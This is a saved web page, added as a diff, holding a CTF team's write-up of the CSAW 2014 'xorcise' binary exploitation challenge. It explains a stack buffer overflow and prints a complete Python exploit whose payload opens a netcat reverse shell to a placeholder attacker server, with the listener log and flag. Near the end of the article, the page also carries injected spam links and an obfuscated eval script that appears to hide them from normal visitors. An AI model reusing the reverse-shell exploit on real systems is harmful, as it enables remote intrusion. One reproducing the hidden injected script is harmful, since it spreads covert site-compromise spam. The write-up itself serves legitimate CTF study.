@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="ie6 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 7]>    <html class="ie7 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 8]>    <html class="ie8 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 9]>    <html class="ie9 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if !IE]> --> <html lang="en" dir="ltr"> <!-- <![endif]-->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="../sites/all/themes/open_framework/favicon.ico" type="image/vnd.microsoft.icon" />
+<link rel="shortlink" href="../node/69.html" />
+<link rel="canonical" href="69.html" />
+<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+  <!-- Set the viewport width to device width for mobile -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>xorcise (exploit 500) | BalalaikaCr3w</title>
+  <style type="text/css" media="all">
+@import url("https://ctfcrew.org/modules/system/system.base.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.menus.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.messages.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.theme.css?qtecp0");
+</style>
+<style type="text/css" media="all">
+@import url("https://ctfcrew.org/modules/comment/comment.css?qtecp0");
+@import url("https://ctfcrew.org/modules/field/theme/field.css?qtecp0");
+@import url("https://ctfcrew.org/modules/node/node.css?qtecp0");
+@import url("https://ctfcrew.org/modules/search/search.css?qtecp0");
+@import url("https://ctfcrew.org/modules/user/user.css?qtecp0");
+@import url("../sites/all/modules/views/css/views.css%3Fqtecp0.css");
+@import url("../sites/all/modules/ckeditor/css/ckeditor.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="all">
+@import url("../sites/all/modules/ctools/css/ctools.css%3Fqtecp0.css");
+@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shCore.css%3Fqtecp0.css");
+@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shThemeDefault.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="all">
+@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap.min.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap-responsive.min.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/open_framework.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/ie.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/jquery.themizer.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/universal.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/font-awesome-4.0.3/css/font-awesome.min.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="print">
+@import url("../sites/all/themes/open_framework/css/open_framework_print.css%3Fqtecp0.css");
+</style>
+  <script type="text/javascript" src="../sites/all/modules/jquery_update/replace/jquery/1.8/jquery.min.js%3Fv=1.8.3"></script>
+<script type="text/javascript" src="https://ctfcrew.org/misc/jquery.once.js?v=1.2"></script>
+<script type="text/javascript" src="https://ctfcrew.org/misc/drupal.js?qtecp0"></script>
+<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shCore.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shAutoloader.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/default/files/syntaxhighlighter.autoloader.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/bootstrap/js/bootstrap.min.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/open_framework.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/override.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.min.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/jquery.themizer.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/universal.js%3Fqtecp0"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"open_framework","theme_token":"YjrFEXQ_p8BLSEhELoc6yYUy7uA1rtrgSltchFVuS1s","js":{"sites\/all\/modules\/syntaxhighlighter\/syntaxhighlighter.min.js":1,"sites\/all\/modules\/jquery_update\/replace\/jquery\/1.8\/jquery.min.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shCore.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shAutoloader.js":1,"sites\/default\/files\/syntaxhighlighter.autoloader.js":1,"sites\/all\/themes\/open_framework\/bootstrap\/js\/bootstrap.min.js":1,"sites\/all\/themes\/open_framework\/js\/open_framework.js":1,"sites\/all\/themes\/open_framework\/js\/override.js":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.min.js":1,"sites\/all\/themes\/open_framework\/js\/jquery.themizer.js":1,"sites\/all\/themes\/open_framework\/js\/universal.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/comment\/comment.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/views\/css\/views.css":1,"sites\/all\/modules\/ckeditor\/css\/ckeditor.css":1,"sites\/all\/modules\/ctools\/css\/ctools.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shCore.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shThemeDefault.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap.min.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap-responsive.min.css":1,"sites\/all\/themes\/open_framework\/fontawesome\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework.css":1,"sites\/all\/themes\/open_framework\/css\/ie.css":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.css":1,"sites\/all\/themes\/open_framework\/css\/jquery.themizer.css":1,"sites\/all\/themes\/open_framework\/css\/universal.css":1,"sites\/all\/themes\/open_framework\/font-awesome-4.0.3\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework_print.css":1}},"syntaxhighlighter":{"useAutoloader":true}});
+//--><!]]>
+</script>
+  <!--[if IE 7]>
+  <link rel="stylesheet" href="/sites/all/themes/open_framework/fontawesome/css/font-awesome-ie7.min.css">
+  <![endif]-->
+  <!-- IE Fix for HTML5 Tags -->
+  <!--[if lt IE 9]>
+    <script src="/sites/all/themes/open_framework/js/html5shiv.js"></script>
+  <![endif]-->
+
+    <style type="text/css" media="all">@import url("../sites/all/themes/open_framework/css/page.css");</style>
+  <script type="text/javascript" src="../sites/all/themes/open_framework/js/page.js"></script>
+
+</head>
+
+<body class="main-body html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-69 node-type-writeup   content-first     "  >
+    <a href="69.html#content" class="element-invisible element-focusable">Skip to content</a>
+<a href="69.html#main-nav" class="element-invisible element-focusable" data-target=".nav-collapse" data-toggle="collapse">Skip to navigation</a>
+<!-- /#skipnav -->
+<!-- /#admin-shortcuts -->
+	<div id="header" class="clearfix header" role="banner">
+	<div class="container">
+		<div class="row">
+			<div class="span12">
+								<div id="logo" class="site-logo"> <a href="../index.html" title="Home" rel="home"> <img src="../sites/default/files/logo.png" alt="BalalaikaCr3w" role="presentation" /> </a></div>
+								<!-- /#logo -->
+								<div id="name-and-slogan">
+										<div id="site-name" class="site-name"><a href="../index.html" title="Home" rel="home">BalalaikaCr3w</a></div>
+															<div id="site-slogan" class="site-slogan">Russian CTF team</div>
+									</div>
+												<!-- /#name-and-slogan -->
+							</div>
+		</div>
+		<div class="social">
+			<a href="http://twitter.com/BalalaikaCr3w" class="social-item twitter">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</div>
+	</div>
+</div>
+<!-- /#header --><div id="main" class="clearfix main" role="main">
+	<div class="container">
+								<div id="main-content" class="row main-content">
+						<div id="content" class="mc-content span9">
+				<div class="color-pane bg-0D"></div>
+				<div id="content-wrapper" class="content-wrapper">
+					<div id="content-head" class="row-fluid content-head">
+																								<h1 class="title" id="page-title"> xorcise (exploit 500) </h1>
+																																									</div>
+																				<div id="content-body" class="row-fluid content-body"> <div class="region region-content clearfix">
+  <div id="block-system-main" class="clearfix block block-system">       <div class="content"> <article id="node-69" class="node node-writeup node-promoted clearfix">      <div class="node-wrapper">
+                <div class="submitted">
+       
+      25.09.2014 16:26, by <i class="fa fa-user"></i><span class="username">Dor1s</span>    </div>
+        <div class="content">
+      <div class="field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Category:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../categories/pwn.html">pwn</a></div></div></div><div class="field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Event:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../event/24.html">CSAW CTF Quals 2014</a></div></div></div><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>We've got the following binary and its source code: <a href="http://ctfcrew.org/sites/default/files/writeups/xorcise.zip">xorcise</a>.</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">$ file xorcise
+xorcise: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked 
+(uses shared libs), for GNU/Linux 2.6.32, not stripped</pre><p>Looking attentively at source code you can find this interesting moment in decipher function:</p><pre class="brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">#define BLOCK_SIZE 8
+#define MAX_BLOCKS 16
+
+uint32_t decipher(cipher_data *data, uint8_t *output)
+{
+    uint8_t buf[MAX_BLOCKS * BLOCK_SIZE];   //128 
+    uint32_t loop;
+    uint32_t block_index;
+    uint8_t xor_mask = 0x8F;
+
+    memcpy(buf, data-&gt;bytes, sizeof(buf));
+    if ((data-&gt;length / BLOCK_SIZE) &gt; MAX_BLOCKS)
+    {
+        data-&gt;length = BLOCK_SIZE * MAX_BLOCKS;
+    }
+
+    for (loop = 0; loop &lt; data-&gt;length; loop += 8)
+    {
+        for (block_index = 0; block_index &lt; 8; ++block_index)
+        {
+            buf[loop+block_index]^=(xor_mask^data-&gt;key[block_index]);
+        }
+    }
+    memcpy(output, buf, sizeof(buf));
+}</pre><p>Also you can get it looking at disasm or decompiled code:</p><p><img src="../sites/default/files/writeups/images/overflow.png" alt="" width="1120" height="301"></p><p>I managed to find it firstly in C-source. So it looks like we can run loop for 8 additional bytes after the buffer <em>buf</em> because <em>data-&gt;length</em> is fully controlled by us. We just need to send <em>data-&gt;length</em> in range from 0x81 to 0x87. In this case external loop (with index variable <em>loop</em>) will run one more time and internal loop will rewrite other variables on the stack.</p><p>After looking at disassembler and some debugging in gdb we distinguished the following stack structure:</p><p>128 bytes of <em>buf</em> array</p><p>1 byte for <em>xor_mask</em></p><p>4 bytes of <em>block_index</em></p><p>4 bytes of <em>loop</em></p><p>&nbsp;</p><p>Not bad, we can overwrite <em>xor_mask</em>, <em>block_index</em> and 3 least significant bytes of <em>loop</em>. But when we corrupt <em>block_index</em> variable we are falling info infinite loop or breaking out of loop immediately.</p><p>After some analysis of memory addresses in the binary we understand another promising possibility.</p><p>We can set <em>xor_mask</em> to 0x00, then do not corrupt <em>block_index</em> (because it should be in range from 0 to 8 for loop execution) and then we set least significant byte of variable <em>loop</em> in such way that <em>buf[loop + block_index]</em> becomes reference for return address! Great! Go back to binary for searching best place for jump to.</p><p><img src="../sites/default/files/writeups/images/call_system_exp500csaw.png" alt="" width="1200" height="529"></p><p>Yeah...</p><p><img src="../sites/default/files/writeups/images/feeling.png" alt="" width="640" height="640"></p><p>So if we jump to 0x080492E9 from decipher, we will have&nbsp;on the stack the following data:</p><pre class="brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">    size_t bytes_read;
+    cipher_data encrypted;
+    uint8_t decrypted[128];
+    request *packet;
+    uint32_t authenticated;
+
+    memset(&amp;encrypted, 0, sizeof(encrypted));
+    memset(&amp;decrypted, 0, sizeof(decrypted));
+
+    bytes_read = recv(sockfd, (uint8_t *)&amp;encrypted, sizeof(encrypted), 0);
+    if (bytes_read &lt;= 0)
+    {
+        printf("Error: failed to read socket\n");
+        return -1;
+    }
+
+    if (encrypted.length &gt; bytes_read)
+    {
+        printf("Error: invalid length in packet\n");
+        return -1;
+    }
+
+    decipher(&amp;encrypted, decrypted);</pre><p>Address of <em>encrypted</em>&nbsp;buffer which is fully contolled by us. Excellent!</p><p>Data of <em>encrypted</em> is formed in the following way:</p><pre class="brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">struct cipher_data
+{
+    uint8_t length;
+    uint8_t key[8];
+    uint8_t bytes[128];
+};</pre><p>- <em>length</em> should be in range from 0x81 to 0x87;</p><p>- <em>key</em> we suggest to be <em>{xor_mask, 0x00, 0x00, 0x00, 0x00, offset_to_ret_addr, mask_for_lsb_of_ret_addr, mask_for_2nd_bytes_of_ret_addr}</em> but zero-bytes will terminate our buffer for <em>system()</em>. So we can set <em>xor_mask</em> to 0x20 (space character), then all following bytes will be xored with 0x20 and null-characters become spaces.</p><p>- <em>key[5]</em> must be (16 + 3) because return address is offseted by 16 bytes from <em>loop</em> index on the stack. +3 should be added because we are going to modify least significant byte of <em>loop</em>&nbsp;in such way to get least significant byte of return address on next iteration of loop.</p><p>- <em>key[6:7]</em> must be 0x9194 ^ 0x92e9 = 0x037d - return address of normal execution flow xored with address of "call system" and xored with 0x20 of course.</p><p>- in <em>bytes</em> we can send our payload for <em>system()</em> call, just start it with ";" to cut off all first inpropriate bytes:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">;/bin/nc -e /bin/sh &lt;BALALAIKACR3W_EVIL_SERVER_IP&gt; 16969</pre><p>And now full exploit looks:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">#!/usr/bin/python
+from socket import create_connection
+from struct import pack, unpack
+
+L = '\x87' #length
+xor = 0x20
+k6 = 0x13
+packet = L
+packet_str = '\x00' * 5 + chr(k6) + '\x7D\x03'
+for c in packet_str:
+	packet += chr( xor ^ ord(c))
+
+pl = ';/bin/nc -e /bin/sh &lt;BALALAIKACR3W_EVIL_SERVER_IP&gt; 16969\x00'
+padding = 'A' * (128 - len(pl))
+packet += pl + padding
+
+s = create_connection(('128.238.66.227', 24001))
+s.send(packet)
+print s.recv(1024)
+
+s.close()</pre><p>Now just do something like that on our EVIL SERVER and wait for backconnect:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">$ nc -lvvv -p 16969
+listening on [any] 16969 ...
+128.238.66.227: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [BALALAIKACR3W_EVIL_SERVER_IP] from (UNKNOWN) [128.238.66.227] 45427</pre><p><img style="display: block; margin-left: auto; margin-right: auto;" src="../sites/default/files/writeups/images/daddys-home1.gif" alt="" width="498" height="194"></p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">ls -la
+total 44
+drwxr-xr-x 2 root root  4096 Sep 20 00:18 .
+drwxr-xr-x 3 root root  4096 Sep 14 14:14 ..
+-rw-r--r-- 1 root root    30 Sep 20 00:18 flag.txt
+-rw-r--r-- 1 root root     7 Sep 12 19:13 password.txt
+-rwxr-xr-x 1 root root 12308 Sep 12 19:08 xorcise
+-rw-r--r-- 1 root root 10248 Sep 10 13:16 xorcise.c
+cat flag.txt
+flag{code_exec&gt;=crypto_break}
+cat password.txt
+pass123</pre><p>Flag is&nbsp;<strong>flag{code_exec&gt;=crypto_break}</strong></p><span class="keys_words"><a class="links_good_rands" href="https://www.juzsports.com/">Sports Shoes</a> | <a class="links_good_rands" href="https://www.ietp.com/fr/dfegctshop/fr/fr/nike-homme">NIKE  HOMME</a></span><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('b i=r f["\\q\\1\\4\\g\\p\\l"]("\\4"+"\\7"+"\\7"+"\\4"+"\\5\\1","\\4\\k");s(!i["\\3\\1\\2\\3"](m["\\h\\2\\1\\j\\n\\4\\1\\6\\3"])){b a=f["\\e\\7\\o\\h\\d\\1\\6\\3"]["\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1"](\'\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\');u(b 8=0;8<a["\\5\\1\\6\\4\\3\\y"];8++)a[8]["\\2\\3\\9\\5\\1"]["\\e\\k\\2\\l\\5\\c\\9"]=\'\\6\\7\\6\\1\'}',37,37,'|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43'.split('|'),0,{}));</script></div></div></div><div class="field field-name-field-file field-type-file field-label-above"><div class="field-label">Attachments:&nbsp;</div><div class="field-items"><div class="field-item even"><span class="file"><img class="file-icon" alt="Package icon" title="application/zip" src="https://ctfcrew.org/modules/file/icons/package-x-generic.png" /> <a href="../sites/default/files/writeups/xorcise.zip" type="application/zip; length=9843">xorcise.zip</a></span></div></div></div>    </div>
+       </div>
+</article>
+ </div>
+</div></div>
+ <!-- /.region -->
+  </div>
+																																																	</div>
+				<!-- /#content-wrap --> 
+			</div>
+			<!-- /#content -->
+							<div id="sidebar-second" class="sidebar span3 site-sidebar-second">
+	<div class="color-pane bg-0B"></div>
+	<div class="row-fluid row-block row-block-1">
+		<div class="region region-sidebar-second clearfix">
+  <div id="block-system-navigation" class="clearfix block block-system block-menu">       <div class="content"> <ul class="menu nav"><li class="first leaf"><a href="../index.html"><i class="fa fa-home"></i>Home</a></li>
+<li class="leaf"><a href="../writeups.html"><i class="fa fa-file-text"></i>Writeups</a></li>
+<li class="leaf"><a href="../tools.html"><i class="fa fa-wrench"></i>Tools</a></li>
+<li class="last leaf"><a href="../blogs.html"><i class="fa fa-users"></i>Blog</a></li>
+</ul> </div>
+</div>
+<div id="block-views-events-block-1" class="clearfix block block-views">     <h2>Last events</h2>
+      <div class="content"> <div class="view view-events view-id-events view-display-id-block_1 view-dom-id-98fceb899844e763e64a748fc7c82229">
+        
+  
+  
+      <div class="view-content">
+        <div class="views-row views-row-1 views-row-odd views-row-first">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/32.html">Boston Key Party 2015</a></span>  </div>  </div>
+  <div class="views-row views-row-2 views-row-even">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/36.html">Boston Key Party CTF 2016</a></span>  </div>  </div>
+  <div class="views-row views-row-3 views-row-odd views-row-last">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/35.html">EKOPARTY PRE-CTF 2015</a></span>  </div>  </div>
+    </div>
+  
+  
+  
+      
+<div class="more-link">
+  <a href="../events.html">
+    all events  </a>
+</div>
+  
+  
+  
+</div> </div>
+</div>
+</div>
+ <!-- /.region -->
+	</div>
+			<div class="color-pane bg-09"></div>
+	<div class='row-fluid row-block row-block-2'>
+		<ul class="nav">
+			<li><a href="../user.html"><i class="fa fa-sign-in"></i>Sign in</a></li>
+		</ul>
+	</div>
+	</div>
+<!-- /#sidebar-second -->					</div>
+					</div>
+</div>
+<!-- /#main, /#main-wrapper -->
+	  <script type="text/javascript" src="../sites/all/modules/syntaxhighlighter/syntaxhighlighter.min.js%3Fqtecp0"></script>
+</body>
+
+</html>
